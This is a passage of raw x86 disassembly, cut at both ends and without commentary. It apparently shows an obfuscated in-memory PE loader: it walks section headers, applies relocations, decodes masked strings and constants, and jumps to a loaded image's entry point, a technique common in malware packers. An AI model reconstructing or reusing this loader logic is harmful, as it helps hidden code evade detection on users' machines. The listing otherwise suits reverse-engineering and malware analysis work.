  427422:	mov    ecx,DWORD PTR [ebp-0x4]
  427425:	movzx  edx,WORD PTR [eax+0x6]
  427429:	xor    ecx,esi
  42742b:	add    ecx,edi
  42742d:	mov    DWORD PTR [ebp+0xc],eax
  427430:	cmp    edx,ecx
  427432:	je     0x4274df
  427438:	mov    ecx,DWORD PTR [ebp-0x4]
  42743b:	xor    ecx,esi
  42743d:	add    ecx,edi
  42743f:	mov    DWORD PTR [ebp-0x8],ecx
  427442:	mov    ecx,DWORD PTR [ebp-0x24]
  427445:	movzx  edx,WORD PTR [eax+0x6]
  427449:	xor    ecx,esi
  42744b:	sub    edx,ecx
  42744d:	sub    edx,edi
  42744f:	cmp    DWORD PTR [ebp-0x8],edx
  427452:	ja     0x4274df
  427458:	mov    edx,DWORD PTR [ebp+0x18]
  42745b:	add    edx,0x8
  42745e:	mov    DWORD PTR [ebp+0x18],edx
  427461:	jmp    0x427466
  427463:	mov    edx,DWORD PTR [ebp+0x18]
  427466:	mov    eax,DWORD PTR [eax+0x38]
  427469:	lea    ecx,[eax-0x1]
  42746c:	mov    DWORD PTR [ebp-0x38],eax
  42746f:	mov    eax,DWORD PTR [edx]
  427471:	test   eax,ecx
  427473:	je     0x42747c
  427475:	not    ecx
  427477:	and    eax,ecx
  427479:	add    eax,DWORD PTR [ebp-0x38]
  42747c:	mov    ecx,DWORD PTR [edx+0x4]
  42747f:	add    ecx,DWORD PTR [ebp+0x20]
  427482:	push   ecx
  427483:	call   0x427d5b
  427488:	mov    edx,DWORD PTR [ebp-0x4]
  42748b:	mov    eax,DWORD PTR [ebp+0x18]
  42748e:	mov    ecx,DWORD PTR [eax+0x8]
  427491:	xor    edx,esi
  427493:	add    edx,edi
  427495:	cmp    ecx,edx
  427497:	je     0x4274b0
  427499:	push   ecx
  42749a:	mov    ecx,DWORD PTR [ebp+0x8]
  42749d:	add    ecx,DWORD PTR [eax+0xc]
  4274a0:	mov    eax,DWORD PTR [eax+0x4]
  4274a3:	add    eax,DWORD PTR [ebp+0x20]
  4274a6:	push   ecx
  4274a7:	push   eax
  4274a8:	call   0x427c51
  4274ad:	mov    eax,DWORD PTR [ebp+0x18]
  4274b0:	mov    ecx,DWORD PTR [ebp-0x24]
  4274b3:	mov    edx,DWORD PTR [ebp-0x8]
  4274b6:	add    eax,0x28
  4274b9:	xor    ecx,esi
  4274bb:	lea    ecx,[edx+ecx*1+0x3272f1]
  4274c2:	mov    edx,DWORD PTR [ebp+0xc]
  4274c5:	mov    DWORD PTR [ebp+0x18],eax
  4274c8:	mov    eax,DWORD PTR [ebp-0x24]
  4274cb:	movzx  edx,WORD PTR [edx+0x6]
  4274cf:	xor    eax,esi
  4274d1:	sub    edx,eax
  4274d3:	mov    eax,DWORD PTR [ebp+0xc]
  4274d6:	sub    edx,edi
  4274d8:	mov    DWORD PTR [ebp-0x8],ecx
  4274db:	cmp    ecx,edx
  4274dd:	jbe    0x427463
  4274df:	mov    edx,DWORD PTR [ebx+0x18c]
  4274e5:	mov    ecx,DWORD PTR [ebp+0x20]
  4274e8:	cmp    ecx,DWORD PTR [edx]
  4274ea:	jne    0x427513
  4274ec:	mov    eax,DWORD PTR [ebx+0x1e0]
  4274f2:	lea    edx,[ebp-0x18]
  4274f5:	push   edx
  4274f6:	mov    edx,DWORD PTR [ebp-0x10]
  4274f9:	xor    edx,esi
  4274fb:	add    edx,edi
  4274fd:	push   edx
  4274fe:	mov    edx,DWORD PTR [ebp-0x20]
  427501:	push   DWORD PTR [edx+0x54]
  427504:	push   ecx
  427505:	call   DWORD PTR [eax+0x1c]
  427508:	test   eax,eax
  42750a:	je     0x4277b1
  427510:	mov    eax,DWORD PTR [ebp+0xc]
  427513:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427519:	mov    ecx,DWORD PTR [ecx]
  42751b:	xor    ecx,esi
  42751d:	add    ecx,edi
  42751f:	je     0x4276dc
  427525:	mov    eax,DWORD PTR [ebp-0x4]
  427528:	xor    eax,esi
  42752a:	add    eax,edi
  42752c:	and    DWORD PTR [ebp+0x8],0x0
  427530:	mov    DWORD PTR [ebp-0x14],eax
  427533:	mov    eax,0xf89c85d9
  427538:	lea    ecx,[eax-0x8]
  42753b:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427542:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  427549:	mov    DWORD PTR [ebp-0x50],eax
  42754c:	mov    DWORD PTR [ebp-0x4c],ecx
  42754f:	mov    DWORD PTR [ebp-0x48],ecx
  427552:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427559:	mov    edx,DWORD PTR [ebp+0x8]
  42755c:	mov    ecx,0x8aa
  427561:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427566:	mov    edx,0x72f1
  42756b:	add    cx,dx
  42756e:	mov    edx,DWORD PTR [ebp+0x8]
  427571:	inc    DWORD PTR [ebp+0x8]
  427574:	cmp    DWORD PTR [ebp+0x8],0x6
  427578:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427580:	jb     0x427559
  427582:	mov    ecx,0xf89c852b
  427587:	mov    DWORD PTR [ebp-0xb0],eax
  42758d:	mov    DWORD PTR [ebp-0x9c],eax
  427593:	mov    DWORD PTR [ebp-0x74],eax
  427596:	mov    DWORD PTR [ebp-0x70],eax
  427599:	lea    eax,[ecx-0x3]
  42759c:	mov    edx,0xf89c85ff
  4275a1:	mov    DWORD PTR [ebp-0x64],eax
  4275a4:	mov    DWORD PTR [ebp-0x60],eax
  4275a7:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  4275b1:	mov    DWORD PTR [ebp-0xac],ecx
  4275b7:	mov    DWORD PTR [ebp-0xa8],edx
  4275bd:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  4275c7:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  4275d1:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  4275db:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  4275e5:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  4275ef:	mov    DWORD PTR [ebp-0x8c],ecx
  4275f5:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  4275ff:	mov    DWORD PTR [ebp-0x84],edx
  427605:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  42760c:	mov    DWORD PTR [ebp-0x7c],ecx
  42760f:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  427616:	mov    DWORD PTR [ebp-0x6c],ecx
  427619:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427620:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427627:	xor    eax,eax
  427629:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427630:	xor    cl,0xaa
  427633:	sub    cl,0xf
  427636:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42763d:	inc    eax
  42763e:	cmp    eax,0x17
  427641:	jb     0x427629
  427643:	mov    eax,DWORD PTR [ebx+0x1e0]
  427649:	lea    ecx,[ebp-0xc0]
  42764f:	push   ecx
  427650:	call   DWORD PTR [eax+0x4]
  427653:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427659:	lea    edx,[ebp-0xd8]
  42765f:	push   edx
  427660:	push   eax
  427661:	call   DWORD PTR [ecx+0x8]
  427664:	mov    DWORD PTR [ebp-0x40],eax
  427667:	lea    eax,[ebp-0x14]
  42766a:	push   eax
  42766b:	mov    eax,DWORD PTR [ebx+0x18c]
  427671:	push   DWORD PTR [eax]
  427673:	mov    eax,DWORD PTR [ebp-0x40]
  427676:	call   eax
  427678:	mov    eax,DWORD PTR [ebp-0x4]
  42767b:	xor    eax,esi
  42767d:	add    eax,edi
  42767f:	mov    DWORD PTR [ebp-0x34],eax
  427682:	mov    ecx,DWORD PTR [ebp-0x4]
  427685:	mov    eax,DWORD PTR [ebp-0x14]
  427688:	xor    ecx,esi
  42768a:	add    ecx,edi
  42768c:	cmp    eax,ecx
  42768e:	je     0x4276d9
  427690:	mov    DWORD PTR [ebp-0x3c],eax
  427693:	jmp    0x4276a4
  427695:	mov    eax,DWORD PTR [eax]
  427697:	mov    ecx,DWORD PTR [ebp-0x3c]
  42769a:	mov    DWORD PTR [ebp-0x14],eax
  42769d:	mov    eax,DWORD PTR [ebp-0x14]
  4276a0:	cmp    eax,ecx
  4276a2:	je     0x4276b1
  4276a4:	mov    edx,DWORD PTR [eax+0x18]
  4276a7:	mov    ecx,DWORD PTR [ebx+0x18c]
  4276ad:	cmp    edx,DWORD PTR [ecx]
  4276af:	jne    0x427695
  4276b1:	mov    ecx,DWORD PTR [ebx+0x18c]
  4276b7:	mov    edx,DWORD PTR [eax+0x18]
  4276ba:	cmp    edx,DWORD PTR [ecx]
  4276bc:	jne    0x4276d9
  4276be:	mov    ecx,DWORD PTR [ebx+0x190]
  4276c4:	mov    edx,DWORD PTR [ebp-0x20]
  4276c7:	mov    edx,DWORD PTR [edx+0x28]
  4276ca:	add    edx,DWORD PTR [ecx]
  4276cc:	mov    DWORD PTR [eax+0x1c],edx
  4276cf:	mov    eax,DWORD PTR [ebp-0x24]
  4276d2:	xor    eax,esi
  4276d4:	add    eax,edi
  4276d6:	mov    DWORD PTR [ebp-0x34],eax
  4276d9:	mov    eax,DWORD PTR [ebp+0xc]
  4276dc:	push   ebx
  4276dd:	push   eax
  4276de:	push   DWORD PTR [ebp+0x20]
  4276e1:	call   0x426e5f
  4276e6:	test   eax,eax
  4276e8:	je     0x4277b1
  4276ee:	push   DWORD PTR [ebp+0xc]
  4276f1:	mov    ecx,ebx
  4276f3:	push   DWORD PTR [ebp+0x20]
  4276f6:	call   0x426db8
  4276fb:	test   eax,eax
  4276fd:	je     0x4277b1
  427703:	mov    eax,DWORD PTR [ebp+0xc]
  427706:	mov    edx,DWORD PTR [ebp+0x20]
  427709:	mov    ecx,ebx
  42770b:	call   0x426c91
  427710:	test   eax,eax
  427712:	je     0x4277b1
  427718:	push   ebx
  427719:	push   DWORD PTR [ebp+0x20]
  42771c:	call   0x427142
  427721:	test   eax,eax
  427723:	je     0x4277b1
  427729:	mov    eax,DWORD PTR [ebx+0x18c]
  42772f:	mov    edx,DWORD PTR [ebp+0x20]
  427732:	cmp    edx,DWORD PTR [eax]
  427734:	jne    0x427750
  427736:	mov    eax,DWORD PTR [ebx+0x1e0]
  42773c:	lea    ecx,[ebp-0x18]
  42773f:	push   ecx
  427740:	push   DWORD PTR [ebp-0x18]
  427743:	mov    ecx,DWORD PTR [ebp-0x20]
  427746:	push   DWORD PTR [ecx+0x54]
  427749:	push   edx
  42774a:	call   DWORD PTR [eax+0x1c]
  42774d:	mov    edx,DWORD PTR [ebp+0x20]
  427750:	mov    eax,DWORD PTR [ebx+0x1c8]
  427756:	mov    eax,DWORD PTR [eax]
  427758:	xor    eax,esi
  42775a:	add    eax,edi
  42775c:	je     0x427795
  42775e:	mov    ecx,DWORD PTR [ebp+0xc]
  427761:	mov    eax,DWORD PTR [ecx+0x28]
  427764:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42776b:	mov    esi,DWORD PTR [ebp+0x8]
  42776e:	push   DWORD PTR [ebp+0x14]
  427771:	xor    esi,0x8aa
  427777:	push   DWORD PTR [ebp+0x10]
  42777a:	add    esi,0x72f1
  427780:	or     WORD PTR [ecx+0x16],si
  427784:	add    eax,edx
  427786:	push   edx
  427787:	call   eax
  427789:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427793:	jmp    0x42779f
  427795:	mov    eax,DWORD PTR [ebp+0xc]
  427798:	mov    eax,DWORD PTR [eax+0x28]
  42779b:	add    eax,edx
  42779d:	call   eax
  42779f:	mov    DWORD PTR [ebp-0x8],eax
  4277a2:	mov    eax,DWORD PTR [ebp-0x8]
  4277a5:	mov    ecx,DWORD PTR [ebp+0x1c]
  4277a8:	mov    DWORD PTR [ecx],eax
  4277aa:	mov    DWORD PTR [ebp-0x30],0x1
  4277b1:	cmp    DWORD PTR [ebp-0x30],0x0
  4277b5:	jne    0x4277bb
  4277b7:	and    DWORD PTR [ebp+0x20],0x0
  4277bb:	mov    eax,DWORD PTR [ebp+0x20]
  4277be:	jmp    0x4277c2
  4277c0:	xor    eax,eax
  4277c2:	pop    edi
  4277c3:	pop    esi
  4277c4:	pop    ebx
  4277c5:	leave  
  4277c6:	ret    0x1c
  4277c9:	push   ebp
  4277ca:	mov    ebp,esp
  4277cc:	movzx  edx,WORD PTR [ecx+0x6]
  4277d0:	movzx  eax,WORD PTR [ecx+0x14]
  4277d4:	push   ebx
  4277d5:	push   edi
  4277d6:	xor    edi,edi
  4277d8:	lea    eax,[eax+ecx*1+0x18]
  4277dc:	test   edx,edx
  4277de:	je     0x4277ff
  4277e0:	mov    ecx,DWORD PTR [eax+0xc]
  4277e3:	lea    ebx,[ecx+esi*1]
  4277e6:	cmp    DWORD PTR [ebp+0x8],ebx
  4277e9:	jb     0x4277f7
  4277eb:	mov    ebx,DWORD PTR [eax+0x8]
  4277ee:	add    ebx,ecx
  4277f0:	add    ebx,esi
  4277f2:	cmp    DWORD PTR [ebp+0x8],ebx
  4277f5:	jb     0x427801
  4277f7:	add    eax,0x28
  4277fa:	inc    edi
  4277fb:	cmp    edi,edx
  4277fd:	jb     0x4277e0
  4277ff:	xor    eax,eax
  427801:	pop    edi
  427802:	pop    ebx
  427803:	pop    ebp
  427804:	ret    0x4
  427807:	push   ebp
  427808:	mov    ebp,esp
  42780a:	sub    esp,0x34
  42780d:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427814:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  42781b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  427822:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  427829:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  427830:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  427837:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  42783e:	mov    DWORD PTR [ebp-0x10],eax
  427841:	mov    eax,DWORD PTR [ebp+0x8]
  427844:	mov    DWORD PTR [ebp-0x14],eax
  427847:	mov    eax,DWORD PTR [ebp-0xc]
  42784a:	push   ebx
  42784b:	mov    ecx,0x75108aa
  427850:	xor    eax,ecx
  427852:	push   esi
  427853:	mov    esi,DWORD PTR [ebp-0x10]
  427856:	mov    edx,0x3272f1
  42785b:	add    eax,edx
  42785d:	push   edi
  42785e:	cmp    esi,eax
  427860:	je     0x427a3f
  427866:	mov    eax,DWORD PTR [ebp-0xc]
  427869:	mov    esi,DWORD PTR [ebp-0x14]
  42786c:	xor    eax,ecx
  42786e:	add    eax,edx
  427870:	cmp    esi,eax
  427872:	je     0x427a3f
  427878:	mov    eax,DWORD PTR [ebp-0xc]
  42787b:	xor    eax,ecx
  42787d:	add    eax,edx
  42787f:	mov    DWORD PTR [ebp-0x24],eax
  427882:	mov    eax,DWORD PTR [ebp-0xc]
  427885:	xor    eax,ecx
  427887:	add    eax,edx
  427889:	mov    DWORD PTR [ebp-0x28],eax
  42788c:	mov    edi,DWORD PTR [ebp-0x20]
  42788f:	mov    ebx,DWORD PTR [ebp-0x8]
  427892:	mov    esi,0x8aa
  427897:	xor    edi,esi
  427899:	mov    eax,0x72f1
  42789e:	xor    ebx,esi
  4278a0:	add    edi,eax
  4278a2:	add    ebx,eax
  4278a4:	sub    ebx,edi
  4278a6:	mov    WORD PTR [ebp-0x8],bx
  4278aa:	jmp    0x42796f
  4278af:	mov    edi,DWORD PTR [ebp-0xc]
  4278b2:	mov    bx,WORD PTR [ebp-0x4]
  4278b6:	xor    edi,esi
  4278b8:	add    edi,eax
  4278ba:	cmp    bx,di
  4278bd:	je     0x4279b1
  4278c3:	mov    edi,DWORD PTR [ebp-0xc]
  4278c6:	mov    ebx,DWORD PTR [ebp+0xc]
  4278c9:	xor    edi,ecx
  4278cb:	add    edi,edx
  4278cd:	cmp    ebx,edi
  4278cf:	mov    di,WORD PTR [ebp-0x4]
  4278d3:	mov    bx,WORD PTR [ebp+0x8]
  4278d7:	je     0x427942
  4278d9:	cmp    bx,di
  4278dc:	je     0x42794b
  4278de:	mov    edi,DWORD PTR [ebp-0x20]
  4278e1:	mov    bx,WORD PTR [ebp+0x8]
  4278e5:	xor    edi,esi
  4278e7:	add    edi,eax
  4278e9:	cmp    bx,di
  4278ec:	jb     0x42790c
  4278ee:	mov    edi,DWORD PTR [ebp-0x2c]
  4278f1:	mov    bx,WORD PTR [ebp+0x8]
  4278f5:	xor    edi,esi
  4278f7:	add    edi,eax
  4278f9:	cmp    bx,di
  4278fc:	ja     0x42790c
  4278fe:	movzx  edi,WORD PTR [ebp+0x8]
  427902:	movzx  ebx,WORD PTR [ebp-0x8]
  427906:	add    edi,ebx
  427908:	mov    WORD PTR [ebp+0x8],di
  42790c:	mov    edi,DWORD PTR [ebp-0x20]
  42790f:	mov    bx,WORD PTR [ebp-0x4]
  427913:	xor    edi,esi
  427915:	add    edi,eax
  427917:	cmp    bx,di
  42791a:	jb     0x42793a
  42791c:	mov    edi,DWORD PTR [ebp-0x2c]
  42791f:	mov    bx,WORD PTR [ebp-0x4]
  427923:	xor    edi,esi
  427925:	add    edi,eax
  427927:	cmp    bx,di
  42792a:	ja     0x42793a
  42792c:	movzx  edi,WORD PTR [ebp-0x4]
  427930:	movzx  ebx,WORD PTR [ebp-0x8]
  427934:	add    edi,ebx
  427936:	mov    WORD PTR [ebp-0x4],di
  42793a:	mov    di,WORD PTR [ebp-0x4]
  42793e:	mov    bx,WORD PTR [ebp+0x8]
  427942:	cmp    bx,di
  427945:	jne    0x427a3f
  42794b:	mov    edi,DWORD PTR [ebp-0x1c]
  42794e:	mov    ebx,DWORD PTR [ebp-0x10]
  427951:	xor    edi,ecx
  427953:	lea    edi,[edi+ebx*1+0x3272f1]
  42795a:	mov    DWORD PTR [ebp-0x10],edi
  42795d:	mov    edi,DWORD PTR [ebp-0x1c]
  427960:	mov    ebx,DWORD PTR [ebp-0x14]
  427963:	xor    edi,ecx
  427965:	lea    edi,[edi+ebx*1+0x3272f1]
  42796c:	mov    DWORD PTR [ebp-0x14],edi
  42796f:	mov    edi,DWORD PTR [ebp-0x24]
  427972:	mov    ebx,DWORD PTR [ebp-0x10]
  427975:	mov    di,WORD PTR [ebx+edi*2]
  427979:	mov    WORD PTR [ebp+0x8],di
  42797d:	mov    edi,DWORD PTR [ebp-0x28]
  427980:	mov    ebx,DWORD PTR [ebp-0x14]
  427983:	mov    di,WORD PTR [ebx+edi*2]
  427987:	mov    WORD PTR [ebp-0x4],di
  42798b:	mov    edi,DWORD PTR [ebp-0xc]
  42798e:	mov    bx,WORD PTR [ebp+0x8]
  427992:	xor    edi,esi
  427994:	add    edi,eax
  427996:	cmp    bx,di
  427999:	jne    0x4278af
  42799f:	mov    eax,DWORD PTR [ebp-0x18]
  4279a2:	mov    esi,DWORD PTR [ebp-0xc]
  4279a5:	xor    eax,ecx
  4279a7:	add    eax,edx
  4279a9:	imul   eax,esi
  4279ac:	mov    DWORD PTR [ebp-0xc],eax
  4279af:	jmp    0x4279c3
  4279b1:	mov    eax,DWORD PTR [ebp-0xc]
  4279b4:	mov    esi,DWORD PTR [ebp-0x18]
  4279b7:	xor    eax,ecx
  4279b9:	lea    eax,[eax+esi*1+0x3272f1]
  4279c0:	mov    DWORD PTR [ebp-0x18],eax
  4279c3:	mov    eax,DWORD PTR [ebp-0x24]
  4279c6:	sub    eax,edx
  4279c8:	xor    eax,ecx
  4279ca:	mov    DWORD PTR [ebp-0x30],eax
  4279cd:	mov    eax,DWORD PTR [ebp-0x28]
  4279d0:	sub    eax,edx
  4279d2:	xor    eax,ecx
  4279d4:	mov    DWORD PTR [ebp-0x34],eax
  4279d7:	mov    eax,DWORD PTR [ebp-0x34]
  4279da:	mov    esi,DWORD PTR [ebp-0x1c]
  4279dd:	xor    esi,ecx
  4279df:	add    esi,edx
  4279e1:	xor    eax,ecx
  4279e3:	add    eax,0x3272f1
  4279e8:	imul   esi,eax
  4279eb:	mov    eax,DWORD PTR [ebp-0x14]
  4279ee:	movzx  eax,WORD PTR [esi+eax*1]
  4279f2:	mov    esi,DWORD PTR [ebp-0x30]
  4279f5:	mov    edi,DWORD PTR [ebp-0x1c]
  4279f8:	xor    esi,ecx
  4279fa:	add    esi,edx
  4279fc:	xor    edi,ecx
  4279fe:	add    edi,edx
  427a00:	imul   edi,esi
  427a03:	mov    esi,DWORD PTR [ebp-0x10]
  427a06:	movzx  esi,WORD PTR [edi+esi*1]
  427a0a:	sub    eax,edx
  427a0c:	sub    esi,edx
  427a0e:	xor    eax,ecx
  427a10:	xor    esi,ecx
  427a12:	cmp    esi,eax
  427a14:	jne    0x427a3f
  427a16:	mov    eax,DWORD PTR [ebp-0x30]
  427a19:	mov    esi,DWORD PTR [ebp-0x1c]
  427a1c:	xor    eax,ecx
  427a1e:	add    eax,0x3272f1
  427a23:	xor    esi,ecx
  427a25:	add    esi,edx
  427a27:	imul   esi,eax
  427a2a:	mov    eax,DWORD PTR [ebp-0x10]
  427a2d:	movzx  eax,WORD PTR [esi+eax*1]
  427a31:	mov    esi,DWORD PTR [ebp-0xc]
  427a34:	sub    eax,edx
  427a36:	xor    eax,ecx
  427a38:	cmp    eax,esi
  427a3a:	mov    eax,DWORD PTR [ebp-0xc]
  427a3d:	je     0x427a42
  427a3f:	mov    eax,DWORD PTR [ebp-0x18]
  427a42:	pop    edi
  427a43:	xor    eax,ecx
  427a45:	pop    esi
  427a46:	add    eax,edx
  427a48:	pop    ebx
  427a49:	leave  
  427a4a:	ret    0x8
  427a4d:	push   ebp
  427a4e:	mov    ebp,esp
  427a50:	push   ecx
  427a51:	mov    cx,WORD PTR [eax]
  427a54:	push   esi
  427a55:	mov    esi,0x3b5a
  427a5a:	sub    cx,si
  427a5d:	mov    esi,0x8a98
  427a62:	xor    cx,si
  427a65:	mov    esi,0x4e3e
  427a6a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a71:	mov    edx,0xf89c85a5
  427a76:	cmp    cx,si
  427a79:	je     0x427ad8
  427a7b:	push   ebx
  427a7c:	push   edi
  427a7d:	movzx  ecx,cx
  427a80:	mov    edi,0xffcd8d0f
  427a85:	mov    esi,0x75108aa
  427a8a:	mov    ebx,0x4f9a
  427a8f:	cmp    cx,bx
  427a92:	jne    0x427a97
  427a94:	mov    DWORD PTR [ebp-0x4],edx
  427a97:	lea    edx,[edi+0x1]
  427a9a:	xor    edx,esi
  427a9c:	mov    edi,edx
  427a9e:	xor    edi,esi
  427aa0:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427aa8:	mov    ebx,0x3b5a
  427aad:	sub    cx,bx
  427ab0:	mov    ebx,0x8a98
  427ab5:	xor    cx,bx
  427ab8:	mov    ebx,0x4e3e
  427abd:	cmp    cx,bx
  427ac0:	jne    0x427a8a
  427ac2:	mov    ecx,DWORD PTR [ebp-0x4]
  427ac5:	pop    edi
  427ac6:	pop    ebx
  427ac7:	cmp    ecx,0xf89c85a4
  427acd:	je     0x427ad8
  427acf:	xor    ecx,esi
  427ad1:	lea    eax,[eax+ecx*2+0x64e5e4]
  427ad8:	pop    esi
  427ad9:	leave  
  427ada:	ret    
  427adb:	push   ebp
  427adc:	mov    ebp,esp
  427ade:	push   ecx
  427adf:	push   esi
  427ae0:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427ae7:	mov    esi,0xf89c85a5
  427aec:	call   0x427a4d
  427af1:	mov    cl,BYTE PTR [eax]
  427af3:	dec    cl
  427af5:	xor    cl,0x7c
  427af8:	cmp    cl,0x83
  427afb:	je     0x427b60
  427afd:	push   ebx
  427afe:	push   edi
  427aff:	mov    edx,eax
  427b01:	mov    edi,0xffcd8d0f
  427b06:	mov    ecx,0x75108aa
  427b0b:	mov    dx,WORD PTR [edx]
  427b0e:	mov    ebx,0x3b5a
  427b13:	sub    dx,bx
  427b16:	mov    ebx,0x8a98
  427b1b:	xor    dx,bx
  427b1e:	mov    ebx,0x4e4c
  427b23:	cmp    dx,bx
  427b26:	jne    0x427b2b
  427b28:	mov    DWORD PTR [ebp-0x4],esi
  427b2b:	lea    esi,[edi+0x1]
  427b2e:	xor    esi,ecx
  427b30:	mov    edi,esi
  427b32:	xor    edi,ecx
  427b34:	lea    edx,[eax+edi*2+0x64e5e2]
  427b3b:	mov    bl,BYTE PTR [edx]
  427b3d:	dec    bl
  427b3f:	xor    bl,0x7c
  427b42:	cmp    bl,0x83
  427b45:	jne    0x427b0b
  427b47:	mov    edx,DWORD PTR [ebp-0x4]
  427b4a:	pop    edi
  427b4b:	pop    ebx
  427b4c:	cmp    edx,0xf89c85a4
  427b52:	je     0x427b60
  427b54:	xor    edx,ecx
  427b56:	xor    ecx,ecx
  427b58:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427b60:	pop    esi
  427b61:	leave  
  427b62:	ret    
  427b63:	push   ebp
  427b64:	mov    ebp,esp
  427b66:	push   ecx
  427b67:	push   esi
  427b68:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427b6f:	mov    esi,0xf89c85a5
  427b74:	call   0x427a4d
  427b79:	mov    cx,WORD PTR [eax]
  427b7c:	mov    edx,0x3b5a
  427b81:	sub    cx,dx
  427b84:	mov    edx,0x8a98
  427b89:	xor    cx,dx
  427b8c:	mov    edx,0x4e3e
  427b91:	cmp    cx,dx
  427b94:	je     0x427bed
  427b96:	push   ebx
  427b97:	push   edi
  427b98:	movzx  ecx,cx
  427b9b:	mov    edx,0xffcd8d0f
  427ba0:	mov    edi,0x75108aa
  427ba5:	mov    ebx,0x4e4c
  427baa:	cmp    cx,bx
  427bad:	jne    0x427bb2
  427baf:	mov    DWORD PTR [ebp-0x4],esi
  427bb2:	lea    esi,[edx+0x1]
  427bb5:	xor    esi,edi
  427bb7:	mov    edx,esi
  427bb9:	xor    edx,edi
  427bbb:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427bc3:	mov    ebx,0x3b5a
  427bc8:	sub    cx,bx
  427bcb:	mov    ebx,0x8a98
  427bd0:	xor    cx,bx
  427bd3:	mov    ebx,0x4e3e
  427bd8:	cmp    cx,bx
  427bdb:	jne    0x427ba5
  427bdd:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427be4:	pop    edi
  427be5:	pop    ebx
  427be6:	je     0x427bed
  427be8:	xor    eax,eax
  427bea:	inc    eax
  427beb:	jmp    0x427bef
  427bed:	xor    eax,eax
  427bef:	pop    esi
  427bf0:	leave  
  427bf1:	ret    
  427bf2:	push   ebp
  427bf3:	mov    ebp,esp
  427bf5:	push   ecx
  427bf6:	mov    eax,DWORD PTR [ebp+0x8]
  427bf9:	movzx  ecx,WORD PTR [eax]
  427bfc:	push   esi
  427bfd:	lea    eax,[ecx-0x3b5a]
  427c03:	mov    esi,0x8a98
  427c08:	push   edi
  427c09:	xor    eax,esi
  427c0b:	mov    edi,0x4e3e
  427c10:	mov    DWORD PTR [ebp-0x4],edx
  427c13:	cmp    ax,di
  427c16:	je     0x427c43
  427c18:	mov    eax,DWORD PTR [ebp+0x8]
  427c1b:	sub    eax,edx
  427c1d:	mov    DWORD PTR [ebp+0x8],eax
  427c20:	jmp    0x427c25
  427c22:	mov    eax,DWORD PTR [ebp+0x8]
  427c25:	mov    WORD PTR [edx],cx
  427c28:	add    edx,0x2
  427c2b:	movzx  edi,WORD PTR [eax+edx*1]
  427c2f:	mov    ecx,edi
  427c31:	add    edi,0xffffc4a6
  427c37:	xor    edi,esi
  427c39:	mov    eax,0x4e3e
  427c3e:	cmp    di,ax
  427c41:	jne    0x427c22
  427c43:	xor    eax,eax
  427c45:	pop    edi
  427c46:	mov    WORD PTR [edx],ax
  427c49:	mov    eax,DWORD PTR [ebp-0x4]
  427c4c:	pop    esi
  427c4d:	leave  
  427c4e:	ret    0x4
  427c51:	push   ebp
  427c52:	mov    ebp,esp
  427c54:	sub    esp,0x18
  427c57:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427c5e:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427c65:	mov    ecx,DWORD PTR [ebp-0x8]
  427c68:	push   esi
  427c69:	mov    eax,0x75108aa
  427c6e:	xor    ecx,eax
  427c70:	mov    esi,0x3272f1
  427c75:	add    ecx,esi
  427c77:	mov    DWORD PTR [ebp-0x4],ecx
  427c7a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427c81:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427c88:	push   edi
  427c89:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427c90:	jmp    0x427d31
  427c95:	mov    ecx,DWORD PTR [ebp-0x4]
  427c98:	mov    edx,DWORD PTR [ebp+0x10]
  427c9b:	sub    edx,ecx
  427c9d:	mov    ecx,DWORD PTR [ebp-0xc]
  427ca0:	xor    ecx,eax
  427ca2:	add    ecx,esi
  427ca4:	cmp    edx,ecx
  427ca6:	jbe    0x427cc3
  427ca8:	mov    edx,DWORD PTR [ebp-0x4]
  427cab:	add    edx,DWORD PTR [ebp+0x8]
  427cae:	mov    ecx,DWORD PTR [ebp-0x4]
  427cb1:	add    ecx,DWORD PTR [ebp+0xc]
  427cb4:	mov    edi,DWORD PTR [ecx]
  427cb6:	mov    DWORD PTR [edx],edi
  427cb8:	mov    ecx,DWORD PTR [ecx+0x4]
  427cbb:	mov    DWORD PTR [edx+0x4],ecx
  427cbe:	mov    ecx,DWORD PTR [ebp-0xc]
  427cc1:	jmp    0x427d10
  427cc3:	mov    ecx,DWORD PTR [ebp-0x4]
  427cc6:	mov    edx,DWORD PTR [ebp+0x10]
  427cc9:	sub    edx,ecx
  427ccb:	mov    ecx,DWORD PTR [ebp-0x10]
  427cce:	xor    ecx,eax
